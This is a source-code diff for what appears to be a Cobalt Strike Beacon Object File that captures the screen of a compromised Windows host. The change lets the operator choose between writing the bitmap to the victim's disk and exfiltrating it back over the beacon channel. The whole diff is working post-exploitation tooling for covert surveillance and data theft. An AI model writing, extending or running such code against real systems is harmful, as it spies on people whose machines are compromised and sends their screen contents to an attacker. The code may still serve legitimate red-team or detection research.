@@ -152,7 +152,7 @@ BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
 #pragma endregion
 
 
-BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
+BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName, int savemethod)
 {
     HDC hDC;
     int iBits;
@@ -226,9 +226,22 @@ BOOL SaveHBITMAPToFile(HBITMAP hBitmap, LPCTSTR lpszFileName)
     memcpy(bmpdata, &bmfHdr, sizeof(BITMAPFILEHEADER));
     memcpy(((char*)bmpdata) + sizeof(BITMAPFILEHEADER), lpbi, dwDIBSize);
 
+    if (savemethod == 0) {
+        BeaconPrintf(0x0, "[*] Saving bitmap to disk with filename %s", lpszFileName);
+        fh = CreateFile(lpszFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
 
-    downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
-    //WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
+        if (fh == INVALID_HANDLE_VALUE)
+            return FALSE;
+        WriteFile(fh, (LPSTR)bmpdata, sizeof(BITMAPFILEHEADER)+ dwDIBSize, &dwWritten, NULL);
+        CloseHandle(fh);
+    }
+    else{
+        BeaconPrintf(0x0, "[*] Downloading bitmap over beacon with filename %s", lpszFileName);
+        downloadFile((char*)lpszFileName, sizeof(lpszFileName), (char*)bmpdata, (int)(sizeof(BITMAPFILEHEADER) + dwDIBSize));
+    }
+    
+    
 
     /* clean up */
     GlobalUnlock(hDib);
@@ -242,8 +255,13 @@ void go(char* buff, int len) {
     datap  parser;
     char * downloadfilename;
     BeaconDataParse(&parser, buff, len);
+    //what should the file be named?
     downloadfilename = BeaconDataExtract(&parser, NULL);
-    BeaconPrintf(0x0, "[*] Tasked beacon to printscreen and save to %s",downloadfilename);
+    //how should it be saved?
+    //0 - drop to disk
+    //1 - download as file in cobaltstrike
+    //2 - NOT IMPLEMENTED YET - planned to be screenshot callback, refer to branch.
+    int savemethod = BeaconDataInt(&parser);
     int x1, y1, x2, y2, w, h;
     // get screen dimensions
     x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
@@ -269,10 +287,9 @@ void go(char* buff, int len) {
     SetClipboardData(CF_BITMAP, hBitmap);
     CloseClipboard();
     */
-    
-    BeaconPrintf(0x0, "[+] PrintScreen saved to bitmap...");
+    BeaconPrintf(0x0, "[*] Screen saved to bitmap");
     LPCSTR filename = (LPCSTR)downloadfilename;
-    SaveHBITMAPToFile(hBitmap, (LPCTSTR)filename);
+    SaveHBITMAPToFile(hBitmap, (LPCTSTR)filename,savemethod);
 
     //BeaconPrintf(0x0, "[+] Printscreen bitmap saved to %s",downloadfilename);
     // clean up
